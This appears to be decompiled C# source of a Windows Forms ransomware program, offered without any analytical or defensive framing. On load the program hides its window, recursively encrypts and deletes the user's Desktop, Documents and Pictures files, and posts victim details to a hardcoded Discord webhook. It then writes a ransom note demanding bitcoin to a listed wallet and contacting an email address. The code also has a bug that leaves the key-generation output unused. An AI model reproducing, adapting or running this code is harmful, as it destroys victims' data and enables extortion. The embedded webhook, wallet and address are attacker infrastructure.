using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using WindowsFormsApp1;

namespace main_space;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".crypted";

	private const string ENCRYPT_PASSWORD = "";

	public string PcUsername = Environment.UserName;

	private string webhook = "https://discord.com/api/webhooks/844169330761531403/WWXtDa7VhC_erlJ7cXL0w_0tNnW0DNuXZtjazuH7VHBCdzFHSljBld4eDMZV4FA-5AdV";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "Your files are encrypted.\n\nIf you want to unlock them send 50$ worth of bitcoin to this address: 36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz\n\nAfter that email your transaction ID, pc code and username to: kabayaboo@protonmail.com\n\nAfter that wait for our response and we will send you your unique password and decryptor.\n\nEncrypted files:\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private Random randomID = new Random();

	private string pcIdFinal = "";

	private IContainer components;

	private Label lblCount;

	private TextBox txtBitcoinAddress;

	private Label label3;

	private Label pcCodeLabel;

	private Label usernameLabel;

	private Label label4;

	private TextBox textBox1;

	private Label label5;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void GeneratePassowrd(string encryption_pass)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectCollection obj = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get();
		string text = "";
		ManagementObjectEnumerator enumerator = obj.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				text = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessorId").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		Random num = new Random();
		string text2 = new string((from s in text.ToCharArray()
			orderby num.Next(2) % 2 == 0
			select s).ToArray());
		string userName = Environment.UserName;
		new Random();
		string text3 = new string((from s in userName.ToCharArray()
			orderby num.Next(2) % 2 == 0
			select s).ToArray());
		string text4 = text2 + text3;
		new Random();
		encryption_pass = new string((from s in text4.ToCharArray()
			orderby num.Next(2) % 2 == 0
			select s).ToArray());
	}

	public static void SendWebhook(string webhook_url, string msg, string username)
	{
		WebClient webClient = new WebClient();
		try
		{
			webClient.UploadValues(webhook_url, new NameValueCollection
			{
				{ "content", msg },
				{ "username", username }
			});
		}
		catch (WebException ex)
		{
			Console.WriteLine(ex.Message.ToString());
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\READ_ME.crypted.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
		((Form)this).set_ShowInTaskbar(true);
		((Control)usernameLabel).set_Text("USERNAME: " + Environment.UserName);
		int num = randomID.Next(999999);
		((Control)pcCodeLabel).set_Text("PC CODE: " + num);
		Settings1.Default.pcID = num.ToString();
		pcIdFinal = num.ToString();
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void encryptFolderContents(string sDir)
	{
		string text = "";
		GeneratePassowrd(text);
		Settings1.Default.EncryptionPassword = text;
		string msg = "EncryptionPassword: " + Settings1.Default.EncryptionPassword + "\nPcCode: " + Settings1.Default.pcID + "\nUserName: " + Environment.UserName;
		SendWebhook(webhook, msg, "Info Sender");
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text2 in files)
			{
				if (!text2.Contains(".crypted"))
				{
					Console.Out.WriteLine("Encrypting: " + text2);
					FileEncrypt(text2, text);
				}
			}
			files = Directory.GetDirectories(sDir);
			foreach (string sDir2 in files)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".crypted", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0098: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_01c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Expected O, but got Unknown
		//IL_026d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0277: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_043f: Expected O, but got Unknown
		//IL_04d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04dc: Expected O, but got Unknown
		//IL_0624: Unknown result type (might be due to invalid IL or missing references)
		//IL_062e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		lblCount = new Label();
		txtBitcoinAddress = new TextBox();
		label3 = new Label();
		pcCodeLabel = new Label();
		usernameLabel = new Label();
		label4 = new Label();
		textBox1 = new TextBox();
		label5 = new Label();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_Anchor((AnchorStyles)14);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCount).set_ForeColor(Color.White);
		((Control)lblCount).set_Location(new Point(12, 9));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(574, 55));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Your files are encrypted!");
		lblCount.set_TextAlign((ContentAlignment)32);
		((Control)txtBitcoinAddress).set_Anchor((AnchorStyles)2);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtBitcoinAddress).set_Location(new Point(14, 209));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((TextBoxBase)txtBitcoinAddress).set_ReadOnly(true);
		((Control)txtBitcoinAddress).set_Size(new Size(574, 31));
		((Control)txtBitcoinAddress).set_TabIndex(3);
		((Control)txtBitcoinAddress).set_Text("36yFAmBGNDowqjXxbaPA2F3byPUoxWfZyz");
		txtBitcoinAddress.set_TextAlign((HorizontalAlignment)2);
		((Control)label3).set_Anchor((AnchorStyles)14);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(14, 64));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(574, 142));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		label3.set_TextAlign((ContentAlignment)2);
		((Control)pcCodeLabel).set_Anchor((AnchorStyles)14);
		((Control)pcCodeLabel).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)pcCodeLabel).set_ForeColor(Color.White);
		((Control)pcCodeLabel).set_Location(new Point(9, 244));
		((Control)pcCodeLabel).set_Name("pcCodeLabel");
		((Control)pcCodeLabel).set_Size(new Size(579, 26));
		((Control)pcCodeLabel).set_TabIndex(6);
		((Control)pcCodeLabel).set_Text("PC CODE: ");
		((Control)usernameLabel).set_Anchor((AnchorStyles)14);
		((Control)usernameLabel).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)usernameLabel).set_ForeColor(Color.White);
		((Control)usernameLabel).set_Location(new Point(9, 270));
		((Control)usernameLabel).set_Name("usernameLabel");
		((Control)usernameLabel).set_Size(new Size(579, 26));
		((Control)usernameLabel).set_TabIndex(7);
		((Control)usernameLabel).set_Text("USERNAME: ");
		((Control)label4).set_Anchor((AnchorStyles)14);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.White);
		((Control)label4).set_Location(new Point(9, 296));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(579, 26));
		((Control)label4).set_TabIndex(8);
		((Control)label4).set_Text("After you make the payment email us at:");
		label4.set_TextAlign((ContentAlignment)32);
		((Control)textBox1).set_Anchor((AnchorStyles)2);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(14, 325));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(574, 31));
		((Control)textBox1).set_TabIndex(9);
		((Control)textBox1).set_Text("kabayaboo@protonmail.com");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)label5).set_Anchor((AnchorStyles)14);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.White);
		((Control)label5).set_Location(new Point(14, 359));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(579, 60));
		((Control)label5).set_TabIndex(10);
		((Control)label5).set_Text("When you are mailing us make sure to include:\r\nPc Code, Username and bitcoin transaction id.");
		label5.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkTurquoise);
		((Form)this).set_ClientSize(new Size(598, 475));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)usernameLabel);
		((Control)this).get_Controls().Add((Control)(object)pcCodeLabel);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Main");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
